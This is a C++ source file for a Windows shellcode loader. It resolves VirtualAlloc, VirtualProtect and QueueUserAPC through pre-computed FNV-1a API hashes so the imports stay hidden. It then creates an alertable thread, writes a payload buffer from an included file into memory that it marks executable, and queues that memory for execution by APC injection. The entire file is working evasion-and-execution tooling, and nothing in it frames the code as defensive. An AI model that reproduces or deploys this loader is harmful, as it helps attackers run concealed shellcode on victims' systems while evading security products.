#include <Windows.h>
#include <stdio.h>
#include <iostream>

#include "base.cpp"

/*

    Pre-computed FNV-1a hashes for the required APIs:
        - VirtualAlloc
        - VirtualProtect
        - QueueUserAPC

*/

// VirtualAlloc
#define VIRTUALALLOC_HASH 0x3285501

// VirtualProtect
#define VIRTUALPROTECT_HASH 0x820621F3

// QueueUserAPC
#define QUEUEUSERAPC_HASH 0x890BB4FB

// Define FNV-1a (Fowler-Noll-Vo) hashing function for API hashing.
unsigned int hash_api(const char* str) {
    // Initialize the hash value with the FNV offset basis (2166136261).
    unsigned int hash = 2166136261U;
    
    // Loop through each character of the string until the null terminator.
    while (*str) {
        // XOR the current character with the hash value.
        hash ^= (unsigned int)(*str++);
        
        // Multiply the hash value by the FNV prime (16777619).
        // This helps to spread out the hash values and reduce collisions.
        hash *= 16777619;
    }

    return hash;
}

DWORD static WINAPI AlertableThreadFunction(LPVOID lpParam) {
    // Create two event objects with initial non-signaled state (FALSE)
    HANDLE x = CreateEvent(NULL, FALSE, FALSE, NULL);
    HANDLE y = CreateEvent(NULL, FALSE, FALSE, NULL);

    // Ensure both events were created successfully
    if (x && y) {
        // Wait for x to be signaled, then signal y
        // The TRUE parameter indicates automatic reset for y after signaling
        SignalObjectAndWait(x, y, INFINITE, TRUE);

        // Close event handles after use
        CloseHandle(x);
        CloseHandle(y);
    }

    return 0;
}


// Dynamically resolve WinAPI functions via hashes from the export table.
FARPROC static ResolveFunctionByHash(HMODULE hModule, unsigned int apiHash) {
    // Retrieve the DOS header of the module to access the NT headers
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    // Retrieve the export directory from the NT headers
    IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Get the RVAs for names, functions, and ordinals
    DWORD* nameRVA = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
    DWORD* functionRVA = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);

    // Loop through all function names in the export table
    for (unsigned int i = 0; i < exportDirectory->NumberOfNames; i++) {
        // Get the function name from the RVA
        const char* functionName = (const char*)((BYTE*)hModule + nameRVA[i]);

        // Compare the hash of the function name to the given apiHash
        if (hash_api(functionName) == apiHash) {
            // If a match is found, return the function's address
            return (FARPROC)((BYTE*)hModule + functionRVA[ordinals[i]]);
        }
    }

    return nullptr;
}


// Queue the payload to run using APC, aka APC-Injection
int static QueueViaAPC(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    // Define standard variable stubs.
    DWORD dwOldProtection = 0;

    // Grab a module handle for kernel32.dll.
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");

    // Redeclare the WinAPI functions as stubs.
    typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    typedef DWORD(WINAPI* QueueUserAPC_t)(PAPCFUNC, HANDLE, ULONG_PTR);

    // Redefine the WinAPI functions using the pre-computed hashes.
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)ResolveFunctionByHash(kernel32, VIRTUALALLOC_HASH);
    VirtualProtect_t pVirtualProtect = (VirtualProtect_t)ResolveFunctionByHash(kernel32, VIRTUALPROTECT_HASH);
    QueueUserAPC_t pQueueUserAPC = (QueueUserAPC_t)ResolveFunctionByHash(kernel32, QUEUEUSERAPC_HASH);

    // Return if the necessary WinAPI calls failed to resolve from stubs.
    if (!pVirtualAlloc || !pVirtualProtect || !pQueueUserAPC) return 1;
        
    // Allocate memory for the payload.
    PVOID pAddress = pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) return 1;

    // Write the shellcode to to the allocated memory.
    memcpy(pAddress, pPayload, sPayloadSize);

    // Check and define protected virtual memory.
    if (!pVirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) return 1;

    // Queue the user via APC.
    if (!pQueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) return 1;

    return 0;
}

// Execution Runtime
int main() {
    // Define standard variable stubs.
    HANDLE hThread = NULL;
    DWORD dwThreadId = NULL;

    // Create the thread running "an alertable function", wowie.
    hThread = CreateThread(NULL, NULL, &AlertableThreadFunction, NULL, NULL, &dwThreadId);
    if (hThread == NULL) return 1;
        
    // Call APC Injection runtime.
    if (QueueViaAPC(hThread, buf, sizeof(buf))) return 1;

    // Wait for the thread to alert.
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
